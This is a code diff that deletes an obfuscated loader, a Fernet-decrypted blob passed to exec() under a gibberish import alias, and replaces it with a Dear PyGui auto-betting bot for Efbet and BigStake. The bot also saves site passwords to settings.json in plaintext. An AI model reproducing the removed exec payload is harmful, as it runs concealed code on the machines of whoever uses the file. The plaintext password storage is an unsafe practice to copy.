@@ -1,2 +1,221 @@
-from cryptography.fernet import Fernet as afnaoinsfoainfqoan
-exec(afnaoinsfoainfqoan(b'WFolQw1uCGhTqh7gqZtALyyNe3EBVThveVIkTYaoy-s=').decrypt(b'gAAAAABkySqs5W1UtEHEIErmw-GArgySroBsPKx3X8DG2pWFX3MV1W5-YFYS2vfz9PYm3sYqdQnfmwIsWHupBMyxjUV2fj2AzpwnsNoganoYyEcMPkIde0rKN4kta6l5ubOZrbVpCio7whUJXlQuifh2G5FE_k2i0KlrNQe1cTpObST6w5DYSMwJB_bSym22Zq98khELNjQVz94OcYofGqN4A8Ip4JAuzju_SKlHwWuvRQAAuZ-TL_lf8xt5nX9RJrCjHg0d7vLx4UxdrVzOX8_YeEDn1YagKz2KM5JEopSvDmLMMIXb5-EibWtnadUq1dPZ_D2xM2Wib0wM0lT8J_iWgUFwGm53hZUAUXwbQDhucBFUnjWFzgdDEH0LJPmo5kdhsINYDz_FyvwZaGVnbAEM1HXGWE0WGtzm-odt0euDMEgaN-80o9zABCmYtTx7bTM6P7C4li1KqpIzrNI1IY5U8OwMVukIdwr29Onx9t63FtuXV98XyhWU00TLcw_wMr78sSHznOxK0uY3gzKkRqUjtP8qWYqTRTTgJKxmldHiWbZs7eoZz-UUCcQKwrkv-2usm1zagiVu7-eNSVWS29a1678aWYgIqfqJ3r0goFBQ76II5Bk-wGe-SeiWVprf8x9vUgDoeBpzHOenNzj6pm7RXrea-T3f_1OAr-xzkfcLBoe9sOEp5XsuMrk8kJtE6tmM6dllrMTXlhD-UCuPZ2GpUmxWN0Vr1Os4I93qDFT6pAnkMh8imcG89lvCdIHucKqIpr1zmjfp18U1DVBzbVyelJXPEOnfiKiLlv9wQpljmFXAeC27GCYHsbsLQOrSiM68Eg4oqyBoEc5wzE5ZcCjhBdauAclzMegPKvTg1-0gnnIxCi8pbdE6CHd4vJUP-voRlp_u39M0asJw7b08cZgTeGkOijk_X8pnvOoJle5aNJnBp08I0tztBD0jvdiA3SJagGZre2GrLVc5TPVWjP8jsgpsk-ESJKbDFVUmSF6UfqHZygvC2-z8SM6WQJyADNUFC18ge_bINBZebKGP7qlAXfnUx6X1-HUMI2TR5KXhlVmoRoxBk40p7xTiuXa80G-PU5ZwnGKwyLuGc1o-31b7IQW9FS1-ibmNplGVQMP8PXuDDR2A8PIYYkBsJavdKKwTOIZ4TDd8UUpam-WF6Bx-mLkoGIKTlcAjkn9ovwzW-1ufwDFxu99XRyQoSFt6FhVAxYdWACJMAKViDv7pUW3HMKQMvIdNfJqSFnr0RmcxuX050DSqRG_y-gC0AK6K0wUNsz5GNNOr5e0pevk0QAl7t7K68-A4A-ARVrrXBJUzekWzCHzTnjd1UtD8ewawN312gCzH-PjxTpy8MUc9_1DzkNlnoF5Lq79bPTPygCvc-tM25AtAC0BSomI1zSaIcVQzGl_2-IaEceRyJ3iuWrzBRZSpGnsgeyWMFaavyMmyaZKtnZQaMXSLuDYt4QM-w-Sza4Vn8i5FusrKxzDveJ7n_q4FP1Ny5YD3wajcWu4jXlLV6FV0zHeFV2KI0F80cnjuq7VjCgWYVi__uxR_ZbAD2f4J-2ApB51cVelQ8G2GWbF-17FevCk1yN7v5suHs7RFWTihGhLBtMDYLaRc6c-buhhXg_GTsyF3CsT_3e51GI_bEOiH2KFuH1KYHi1ezxX7I2Kuzh7Et0dlthH9_cLgIvlAkpKUlcdcHtUL2iM2LzuE0V71_LgZx1jqZt2WPfMiAnspEWE8X7Z-eUAu3m-MIQ8PqOF5vbKjHB0PgjwOBbvoMJEKaPtNX_1UVYNA3wQqAClU6YyHQaDd9Y1xCOS4Y8Jt29dvwT5yxg8oZUUkpoDmnWc3Or54CxIysMg5O8QIgPFXrL_TKGr8Uod2NQT8LXx4l2mvp1KDVekDWTdjJVXGAkiJWpx6gQRN8ZzUP_V_bsaS8mgjnWC2EqkQ3MJr_jZqFLmPb3Zq5Rd8Jfnljs2Y0DqAwRw9CIvveXTTPINlygyYKf_KXS9-mw1ChLtF-_8q6dEMj8KeLsKGSiKPLniiexybuJs4iiH6rnR5JG7wgXbxgcT-1gkB_ZYS1st8FKAoIUwaeAIm7W5z_2iFEArNi5A-XcFVwxE3QX2XiKfCeTJ1aUVJ7T4GHJi-pTVR14tlkKBOYWGHsCqKqGU7GBrFmG2a9rTPaD4Wvey2_5JmUjXnOpo6RwjEhMWPPSIWnfkucE0g0Iiotxoo_tlCBwj7l4ytdoTT8GvUQtam2rEDg1aL_02-UtwDT1zakk99j6XxgH7KWYARqALROI8EpAx2g-__EDZtQVBxtb7dvSCc7VYp7dPcymridy6r9lXHuc8F-HCTSdo2nncq63tgEiV525lDQzIxusJDql8BeivVZA3kA-jathMWD53v7EMwBoIS5HwmKD5MlJES6HLKOs_T8xFo3kLG6oL5I2zDzImVZF15BpskZ2u8LUSGny7YTmyFaX9Z3bKenBhAl17At0R1UxRyE9TV2u8xmwd5TO1txpTOQawLS588mHWyT3QdjsyqChxr2ypis8zCOGuuq71TqWj_KaibPYEuCAmWGSOxNIjC0guMAtXgiTuCC0bFyuVU-OtV0Cqzt9-J5HnwY9TdVxAcxdf-7N3mW2cntpnsq4BBlGx4DPUUUSF-3SwbAWRUAr3G3BjkKDMsE2U-k1y0krMjU1GbxICId7kkQrDUZbzVVfV2PAhWOrEZaWbsUXGCpdmZLFLMwrzPf9AmEhxWpf7cgxESo6PnBTCoyiX8wgKRwd9V6C_7act1dW-DjudAd0P12TyLOfx6Awrc-RAj-VKCwnvJ8XIzC6qXWmpzMi0GDoi1kg_chim1Z8B1NFNMKrGeAL0LAeyhlpv9saMzylshVFTRuYbNAJuL3aTeEjtYv_ZSRn9tqO3LGzrC1a2n7GsRdjy7jwwzJWNTwbCKP2iq0wlKQvHuGR92ctfMdfQrK5qjzN2B8IsWu8azp6EnJonw44FoHDb7E0B7OMqlxj4nMyM7JiQNCtkdScvNmZBooVWdEusnoXknU12hMzpNRd_Go7J1W67T89x-goC0qbiHSNgrq1cL9Ciw1S0EoBbQteFNn4rcpKQ59GKYuhjrH4kqWS_lxd6mTfi_RE4N5DiWLOinWmzh3ueOyCpI7jIIhBG-c9KcmyOSvPX252DUhTX0BiQ6Qr4VB9XAXzPUF7_21XkW3E0XzTED8FDVyZA3MOMqkyIONSmdZRf9ms6XDG60tSoC93zpa8qa8XsZCmcFl6AR6U7dw6wp6WpEVVebqDMyYpY--s1QYPeoX-GpPrpyUeu7ipA7rGhSacT09NQtnLX_y6YVHGKDbevBKK1LD3oBngXmbndkOHEukUBF6uG3szbIwtu_uzowKv4SXUVx3oKAs3guLKel-971ms-nWyp2pFvr2mZMOFCnEILtjbwovgcugMZd3d5caBLJxKyv1DOwcJEZ1ufZqzN54as89H9sB5x6O2Qat2f7aX-FhBz6ZAgYTkVirg5NZXmIdjCqYH9SnzVhdqzTt9Nb3MxuucyaYQnWA7tLM-kms-pAMoPWCmvAFVDzR3WguFOhABGvvUprAIp7JXbN8ArkqQsNFhAi7sBDVES7jBaYSNZo2SS04We--wchIhofpa7WMPxLI4eLxY26ZMeOMb8-Mk9M9fiYobIjJ_ys0EjWZI0zmADKanHPSdGQ1KS_gDzaVygQAtj5CuD0QnH5FhbJs1u3GnYvzpRZv8lMK2S-cspgXMrzjuVdaxv_jkzmuDekzXEB2ohDG8rf7tDhyLH79idLnTPuDsC_agZePvbGWKcXw2RNZdJ4TMLRDb_1Abw-USLKScMu2pw4ZS_ErTM45-WlSA5Q_AMdBx0RdzZqbB0PVEtB8nEgFG90NTlzFLYJQo3CXRBmugohkfanix0OyD1ES71bhDt1FaUGU3D3cPk_TK4FA0t2YopT85n8p5oMPHfFC_SWZkhVBVddREpWhuaeXPmd3Ko_jNDpuyNaplL5HfHolw72uaSh6OzLJzDlGqlzYH3T1y22tbvJU1H0HP-w5u65TuZZHPS_no2dGRqyAr38Yr4pFGw84kwcHJRxhyHKE2bcjZ47DL605sBUzFb5SagxN-RQl6_S_RnrlWWgaDFJ2wHNe2eLxJ1BaTTTToYAdaDyYiMbSJuD33Qm2c_SjOQENv-xO4rOwSyX7xyqZDhd3ZtbqSnjec6H0yqbt7fj2QbTK5TZ3VjKyNdtctD1fB0atatUstmWr-ZyG6sQ-03sgPQv0bL1m0lmSQ-AX5ADmeJEfQEEIKEqwwedl-LSfChrPlmzpwDF8P2ZH2hJq1J6ZtObFF9PwZZctxDmo-I72f93LsgJEEYDVfk4C8OxhjS7X-Dcu-VmvSq9AAa_m2y05DeVtiaEbXF9ur_fRuE2Al2tnsw5MzwyiyLREzK1tKoT075FeWAnPeIXP_UudNdzWGFN9K_GrjROL1VB7ad_eD2imwCHtOj5JwuTIWYAUJ0wMQ_J9TXg0EFJB1_nEn09CxuIj7y-I1QSd_3dQyQk79zQkgi6d3eDFTpimlUZd6BKplrgsnkFd4uB5D8U4uy7RCs-aGoYQ1AqAKSZKgj7QGJ_RfiVawU5KfT8HTT-7RNJfokaOrANh5Y4WizkIA3lahqQw3zlY1e1IAYmjYr9OpmdjIe121nyCfsnGeRUaSbC_zEwL63eFmVShHju5mcTSkvzTybd1xFCXU-cjKrEHwVNdpDHy8YOfe2cQC1ws0621jAN0KU5Jk3qFKNo7NoGdfFBkfAcjYMaPMKgqzdj_t_y9cXwuoM1pF1Fgg_eh84f_2HDuWn0CIXqTDs8CfmzxfczjeNj2CMC7o5XfiOikunTjAnuii2pAorJiH4T6N0q7tQUTYKb4e-89ufrSTmcfXn2TDOyNAmpLKYUm3VaWjkIDm-mFKEN_v0uENCg0qXSk8sF38VGxBAMgCKOE7WEXT7RpDNB4i5ix0_x98AoUUdov_vqj-GmXCQKETji3KaOtrP0VWxDlMPH3M1bL1vNqwwdMIlod9AgMb39yqC5DGIA_7BPaBCeoD-NQTlbdze0POwkNmrhYhsXd8-g3O8lKo84V7AnF8K3_ZaA6Sko5RMK3v7BFrXTc1buAs74uREqw-KxqLBr-yB4xnV4iovxniAmHZjMArfB-gY5hQlEzVn4sw0OeZabBwoAne492BkTz__eWj9vnIVPIMAv-P23asbyUPfyo7rKAt1MymmKo8D9yQ04n7CQBjTIe4_NNALb3Vj4c9vHoHDg6ZCrLaqOff2RuAiW4magrlaO76EBbKBhMGmyBFK61TCZnN842b5bwdki-o-N9S4o5WS3syrMkrCjSc-AeZwVCA0C7u__KZm2C5KYBjShLtiXlcU87sxh1rQ_h1eu8RL-ydaM1G7E4uFgLMS1E6pWsFIuqffxZjwkZfB2XVYrRcVzRv7q2opu_1xa05mh6cPtDqxh7TkzhYdlMY1-LRaAaqNRevyimMsLsNWvyfska98A-qZjLZxtH1aQ_VJn4qjsR2ur-uakNek7NFlvECfW1WsAwJqePoobk-ZcM7I60QGhdR1_7t-HLbCzk91jkoGjIH_MarOk2MeqBjQ7QZEw_dgoytU63XIju-qhULzBPrMDOGLIxBznB5QEh6wnj9UF8jp40etruw-MXD6SEzKtE2dDx_1WjZ6gpYaW_InmH0kRSvqhM6WRxkZPeE33gkKhcbbTxjTOc_BXhqv0DqNw74y52fugneXcyzs-Upm_77xLik70o7yk96RtXecFZPfUCNbyTgDaaFs3doxpN_tq6PUztZFSSNzJPOzNJDynQtsoh8GyJq1LFqshnxaMk5fC2YTJgl9DqEGJkjU27i88MUNa_ygMafSF-1NIZWBt2wda197vTnASZPlw8gNSzs2XY4evLTkYm6pjQxRklOdl8SRh1OG7oiFTaqe76HCDGee_dcgapthJX3WjC-cpPkiFRjBZOwpeNN8hEEJO2mlaKTiOGpvalKJ0-VHJMKr-KEfBdzeNZ8C7n_I2lVVVWYc3DzMPHUZwbVfm8Uo_kj_xXd4Gk2dIW1bu8IcG0DnCA-V0Nlzwknq5XfQZD-d7yvPE6_QatxgWgY-AhEL10pRAq-G-uN74mOUIdxAIgkmTV8azhRDsgMkMHho7xdvQOk6jy59rkVGeOqwbunOcAtp8kSZVpoLcgYn4u6WSjOfSMZJ2rtLJ2lyPHanzJfvBCl2Drkc_u08OiwskM7IbMGvF8MWtdKq_872EohzpDCXtvPJfHenXOWknOmFay-6wLaFrkzcjvfmwBfwIAduapZ3nLhe8zCFx_cmBmK2UdjFkDedpOcJh1v38joNLTpC5QouQHVXb0T2IhlTLCs5BUG62o7pnmECBz9o44x6JdHprADvwVW-CrksVoyBfowx3tMnMo6MLGePb55kGsaDvX5TLPE7AqyNakYyBKMzjlWHfv-UrvY9KFki7g3-Gp9o1Gblys0EzwuneGVNPdr53c6-02orkPzGfcfye6dCmM3pBRsv0o8f-CKCu4SeKg_sAmi0ZYjjstewJDCIO3EgGMGrybK5iO0Ny6mX1nkszwhJBhBMQk-X6X2hVWyl6V7JadbzI3rCsj_zxRVU-qSRWox3pg_KyMOI4aL1JfnRLmzzKXsSYbQvfbLDt2a9zHxFWaAkD_mmZh91HVD7mbVtmXqTO4HrYBcOn3F6qgxGMNNqpMc1ANtopIBACZ3rlz6EHsQx1dzW8NGP4bMqbT25EJ0pCPL0tbZypjMsiRMFxvK1h_qO2cWkzqluat__PI5N507HjXAwMzflzaVzct5nKSaRv1_eFZch5RurWXIlYzyxCZCHbBpP2ufeY7Cm9piI09KV2KLGRM9nUe73rD0mLWagq75zlVPNVhgdRJBIOm6Tu4_gbFtRFPmV1IIjLv6_7_NENBeQgUwXbbqsfPQD7ORdy6HTN_QoSFUxEKetgObDb2Ow90IGaLDSMymkBTmAETuBVVAKEc2szPLWROqZzL_lgUMFC2Bkp7kPZl5CKOk6vx85EyySH9ge30zkoedaEqX59DaJButo7L1QcMFMlZTEanVqbadcLDQ0jRqI5Q_rhVkswB-Qlm62l6Kl-snMK68PXayL1ESsmw84Vfx2nrfUK3VRn5VAt4UafpkGn_Q7fOzsDLSsHSW0xx6RmncULADXPYqbAhWCIvAYq4dpJhNMgxk7TKqz8Haqo8wHRzPMWTZjYoF1Uu6ygvYQ2auAEwdszm-EJle0HQ7nIYaHSNGK09W5Kogv_jbEsVJAgGOXu4Lbg-wzZVZlVtbZBA_mocICEUWb9GDz0R3pRcdsjHBaF25fynYUtEr3eIeplQHhMPmDAWJj8RzU4Z7iC9o4etsg4xm13n8cUiGNSt3ZudsW-oZso4e4Ezfr5d9gYlkJnvNQ1jNP8RsfRZP-2uCIwO17QHZ-krQH0glNKAyvTI_oHhSb1pqu841lIB5u0phv6L-ONBcxjx28DCxXtfXOMlDX3mmpliXI2gHoAeBFVmDfEU95mVI-6brt77zvrwM2cIdLXIxBaKLLhJbHmxOni7iyAXgcZkKKadyDLVJmNE_GHvvDDhktRQdg-1Xl1ZGNLOgt2LnFkFpS4C9vdTlYhdt0PyE1HofebWzxRxjpIKQLhqvOym9Q_uIOJmnyO1NiiUi6eMpk8z81rQ7-sgEu0R6g8RqG8pD2cBovJdnV8yERDPDmdfPEwQoH7d2FwSGqyUY4OqTdmD251Fdpgcv1plqRLMVj1IErBT5KQRbwuvERLixAyjA5HgwlnIvWBkY6RMr7PI9nk88xbcC5H30yOAIwpF3Rnz0CKSkV-JAjYRsv7BZ87ZfPraYhN7MUouGabfYYgNud1JiJ4diIPgGyIXqNtA6TDhUqTKsw6gBqk0r-xNqjfQuE_zExEfNTjRZt02VrzVqagT_o_ExgOBJBodHCzJo-rreA3N2U0xdEGLQ0QMVCtQKsMOHbXYf2mXjCejE3UkS4OrzZlsb0_2rav92fnV_N9j1d2Bhc6KF4dsXaqjetCZuXSjKCOpyOwftfiqm3WqFmQvt3SJyl4yMhEtPow2nbIoTmIykkS1AABbaBrfL0WXwuk_3auG16KMbq6_1FILo-vCyX6E0SooSq-xC4gwonuEEcasLt8mFikJzm-RH_13ZAozInn7s4CN7e6XX5Ke1zNIF69R40s3gQmiXTrybUdmYKTCA6_S36h7mM00b7npl4XVNjx_R3krwB0oXG9yyt4bI6i2VfRZpMbqfDV3aLF4iDwPjY9SmLF1EAINuwlPOWEgIrUhrZ68SVvRPGznx_8IBHlVTz2l2MUaffYWqbztkqdytrKH-OmrkXIBf_bt1mGXzOap0vpn9ai5MBK39aLaw4qbNlqoKYThhBtsmiGee6BlaWdwB8uXWNw9fWbMln4lLop8lWeCnKHlFhyV1VIIJqfJFkNDfQ6nlXM9Udw_0-nWmxhvhqnzpwdKb3wnZseJy0rKSIMbOPadIeNBd6PgXsUrWNYRX4v02wH3F__JDoQL2sQahZw69yObLijP2gIFp3RWQS1bK5CgTfhjKRx8Id86m6g9_cx27AdJdlTs72rXZs70v_Q_e3BeAaMFdzO9dnJSTd3W_iA4FcBzyLjsGLzZUmvV3vATznZStsl4fJfTmloGza9C1a1xFFsJ5vwk2-lHf3LxkBTBEkz0z1hXAoWqpsDIRi5IDJ-XgnbPti4FmthnAnlhjWZGIZ6DzqfWn97lVU2O8MFyMfOTmnfoxjY_7JE2EjRqZtrR7hB_0PVdHUvEtVQToAkpo_SxOqGYReQY6M1CM3swKDUgUO1I_y7LtACXIUqBvaI6QmDnEx0TVBYU6tiYui9EkKzcl0ZQwKAPsrF1KzXRWcH8CzHw_JGx3ZYrpC3jSVnW-Ejx8jwPdbIab6JhCRQR-lC-DijRdfW7ajQ1V7Gnrs8z9noZjHbylRSKFJ0adC-lwv9k9zCfP7tH3aXNvQU_flnX-hdStAsBysDO2HZ7lJMlEn3iXm5i14hXArmpkcdTGL3WccRqnKgtHv_sUbiecuK8tXfcK0xuUszeuQJ9lK0UEeBno3RNqMWYA6WwbXyACTIv59PzzgxAtFvvVqRmMeJYwIzVPG0G5-HbVoPlJbE4YsOW4Ur60vCae6GBvO7RAs6_pOI-ycf9NjILpjzCM4rsfQRM8ZrJzLPDfMoxG0EjRzJdt6314dNMCTBGu5fHJi1iwaTlCKpsmv-wQC4JnLwZBhfTXRv9LBE6GRiRnOAAqWqq3uuO8nTNubaOnkui6lE80kRLK5g0KmLuHxfO-1TZfcWjpMyK84GBaLdRWaxHuwgdbb76zJX1yUN59oQgl0mtcg8Wh8eIPdDWW5owW7afPahsY54SmuYl7nVTXH_zY-imwW1B9Xlu9wBUKpX9rv7BQ04Wg8Jqf9lAeAtt-7OgYlAtSdYRsSkJqBGWJMhV8h_Xgm5gi41t9WfFo1WZUk0JtUV4AwpE8loJOkmZnR04k0SIhcGFS10qUOLI-RfnvrCtFI-LUc3UsuwWWm4Yid04ct_9Bq_mUnw-osV_dEadILJAP6PriNuFaUkmuj1-dLAHgjDvDZnr6BzrTh_WoTCN8sSSAPEh89bSlbnjKn3eHh6r7vQq_mvRm0Ohg42sU5SdN-_dpsOnCzKStDeyhevaMDrCjhYTgEx17Gk-LnIBgYtP3Wt54js6UslU73-WrXDTmN6GJ3Ib5LWtBeUrUMEbtZPvVl2KP1L0e8GVrAtW60-AdsBBAXN5Wi5yuBdNjcRkNWkuCKZc1brxACshyBGXgHXmkZlWb_vMfLM9PjkMYfbJDt2pHV-VEYv8wqisfxWV2TbyNcDmUKBwKsEfaHhozZAx_FdmF7Vggo92KROsKWLMOa8yfX1MI1x37ykBVCl0PQqHU3wBosCZqBxCZlqHo6TwFzBEAw2RSITiKJcVHLKL7QHQNoHHl6NfUVZW2PDyJJhpNXcnzc0wIajswQv_YO9BRn2nTOJiVMQs6DlgiAJaajEWsDdFE3ThDEe3SJniY5TA5s1PVOfQW92gPwPcnptrUAgaqXMaU24lrRljS_hvCHoZIgJFNLl3qGDDMUoSzLVA6mSoXrp6iBpFBsXXaTwmOzak1cH9_lnOwh8LAaNI1v5tORr9ALykGr8oEM0_iqPfCXeR3C6LjoXSbD0hd_j-KojTfS0f35ChRQaNDh4sqc=').decode("utf-8"))
+import dearpygui.dearpygui as dpg
+import pandas as pd
+from efbet import EfBet
+from bigstake import BigStake
+import json
+
+import logging
+import logging.handlers
+
+logger = logging.getLogger("mainlog")
+formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
+logger.setLevel(logging.DEBUG)
+
+stream_handler = logging.StreamHandler()
+stream_handler.setLevel(logging.INFO)
+stream_handler.setFormatter(formatter)
+
+logFilePath = "logs/app.log"
+file_handler = logging.handlers.TimedRotatingFileHandler(filename=logFilePath, when='midnight', backupCount=30)
+file_handler.setFormatter(formatter)
+file_handler.setLevel(logging.DEBUG)
+
+logger.addHandler(file_handler)
+logger.addHandler(stream_handler)
+
+class DataValues():
+    excel_path = None
+    __doc__ = "__doc__"
+
+def save_values():
+    json_data = {
+        "excel_path": DataValues.excel_path,
+        "cassa": DataValues.cassa,
+        "eventi": DataValues.eventi,
+        "prese": DataValues.prese,
+        "quota": DataValues.quota,
+        "bigstake_username": DataValues.bigstake_username,
+        "bigstake_password": DataValues.bigstake_password,
+        "efbet_username": DataValues.efbet_username,
+        "efbet_password": DataValues.efbet_password,
+    }
+
+    json.dump(json_data, open("settings.json", "w", encoding="utf-8"))
+    logger.debug("Setting saved")
+
+def load_values():
+    try:
+        json_data = json.load(open("settings.json", "r", encoding="utf-8"))
+    except:
+        return
+    
+    dpg.set_value("Masianello Cassa", json_data["cassa"])
+    dpg.set_value("Masianello Eventi", json_data["eventi"])
+    dpg.set_value("Masianello Prese", json_data["prese"])
+    dpg.set_value("Masianello Quota", json_data["quota"])
+
+    dpg.set_value("BigStake Username", json_data["bigstake_username"])
+    dpg.set_value("BigStake Password", json_data["bigstake_password"])
+
+    dpg.set_value("Efbet Username", json_data["efbet_username"])
+    dpg.set_value("Efbet Password", json_data["efbet_password"])
+
+    
+
+def read_excel():
+    df = pd.read_excel(DataValues.excel_path)
+
+    matches = []
+    for _, row in df.iterrows():
+        matches.append({"name": row["Partita"], "segno": str(row["Segno"])})
+    return matches
+
+def read_data():
+    DataValues.cassa = dpg.get_value("Masianello Cassa")
+    DataValues.eventi = dpg.get_value("Masianello Eventi")
+    DataValues.prese = dpg.get_value("Masianello Prese")
+    DataValues.quota = dpg.get_value("Masianello Quota")
+
+    DataValues.bigstake_username = dpg.get_value("BigStake Username")
+    DataValues.bigstake_password = dpg.get_value("BigStake Password")
+
+    DataValues.efbet_username = dpg.get_value("Efbet Username")
+    DataValues.efbet_password = dpg.get_value("Efbet Password")
+
+def start():
+    logger.info("Bot started")
+    read_data()
+    missing_settings = [attr for attr, value in DataValues.__dict__.items() if not value]
+    if missing_settings:
+        logger.error("Missing Values:", ", ".join(missing_settings))
+        return
+
+    save_values()
+
+    bs = BigStake(DataValues.bigstake_username, DataValues.bigstake_password)
+    eb = EfBet(DataValues.efbet_username, DataValues.efbet_password)
+
+    bs.create_masaniello(DataValues.cassa, DataValues.eventi, DataValues.quota, DataValues.prese)
+
+    matches = read_excel()
+
+    n_match = 0
+    masaniello_working = True
+    while masaniello_working:
+        match = matches[n_match]
+        quotes = eb.search_match(match["name"])
+
+        if quotes == False:
+            continue
+
+        amount = bs.update_masaniello_quote(quotes[match["segno"]]["quota"])
+        if amount == 0:
+            masaniello_working = False
+            continue
+        
+        if eb.place_bet(quotes, match["segno"], amount, bs) == False:
+            bs.go_previous()
+            continue
+
+        bet_result = eb.wait_bet_to_end()
+        ended, cassa = bs.update_masaniello_result(bet_result)
+        
+        masaniello_working = not ended
+        if float(cassa) <= 0:
+            masaniello_working = False
+            continue
+        n_match += 1
+
+    bs.delete_masaniello()
+    logger.info(f"Finished betting, cassa: {cassa}, matches: {len(bs.bets)}")
+
+
+def file_selected_callback(sender, app_data):
+    dpg.set_value("Excel Input File", app_data["file_path_name"])
+    DataValues.excel_path = app_data["file_path_name"]
+
+dpg.create_context()
+
+with dpg.file_dialog(show=False, callback=file_selected_callback, tag="Excel File Dialog", width=600 ,height=400):
+    dpg.add_file_extension("Excel files (*.xlsx){.xlsx}", color=(0, 255, 255, 255))
+
+with dpg.window(tag="Main Window"):
+    with dpg.tab_bar(tag="Tab Bar"):
+        with dpg.tab(label="Masaniello"):
+            with dpg.table(header_row=False):
+                dpg.add_table_column()
+                dpg.add_table_column()
+                
+                with dpg.table_row():
+                    dpg.add_text("Cassa: ")
+                    dpg.add_input_int(tag="Masianello Cassa")
+            
+                with dpg.table_row():
+                    dpg.add_text("Eventi: ")
+                    dpg.add_input_int(tag="Masianello Eventi")
+                
+                with dpg.table_row():
+                    dpg.add_text("Prese richieste: ")
+                    dpg.add_input_int(tag="Masianello Prese")
+                
+                with dpg.table_row():
+                    dpg.add_text("Quota media: ")
+                    dpg.add_input_double(tag="Masianello Quota")
+
+        with dpg.tab(label="Credenziali"):
+            dpg.add_text("BigStake")
+            with dpg.child_window(label="BigStake", height=63):
+                with dpg.table(header_row=False):
+                    dpg.add_table_column()
+                    dpg.add_table_column()
+                    
+                    with dpg.table_row():
+                        dpg.add_text("Username: ")
+                        dpg.add_input_text(tag="BigStake Username")
+                        
+                    with dpg.table_row():
+                        dpg.add_text("Password: ")
+                        dpg.add_input_text(tag="BigStake Password")
+            
+            dpg.add_text("Efbet")
+            with dpg.child_window(label="Efbet", height=63):
+                with dpg.table(header_row=False):
+                    dpg.add_table_column()
+                    dpg.add_table_column()
+                    
+                    with dpg.table_row():
+                        dpg.add_text("Username: ")
+                        dpg.add_input_text(tag="Efbet Username")
+
+                        
+                    with dpg.table_row():
+                        dpg.add_text("Password: ")
+                        dpg.add_input_text(tag="Efbet Password")
+
+        with dpg.tab(label="File"):
+            with dpg.group(horizontal=True):
+                dpg.add_text("Choose excel file: ")
+                dpg.add_input_text(tag="Excel Input File")
+                dpg.add_button(label="Directory Selector", callback=lambda: dpg.show_item("Excel File Dialog"))
+
+    dpg.add_button(tag="Start Button", label="Start", callback=start)
+
+def resize():
+    x = (dpg.get_viewport_width() / 2) - ( dpg.get_item_rect_size("Start Button")[0] / 2)
+    y = dpg.get_viewport_height() - dpg.get_item_rect_size("Start Button")[1] - 300
+    dpg.set_item_pos("Start Button", (x, y))
+
+with dpg.item_handler_registry(tag="window_handler"):
+    dpg.add_item_resize_handler(callback=resize)
+
+logger.info('App started')
+
+dpg.bind_item_handler_registry("Main Window", "window_handler")
+dpg.set_frame_callback(1, load_values)
+
+dpg.create_viewport(title='Efbet Auto Bet', width=900, height=600)
+dpg.setup_dearpygui()
+dpg.show_viewport()
+dpg.set_primary_window("Main Window", True)
+dpg.start_dearpygui()
+dpg.destroy_context()
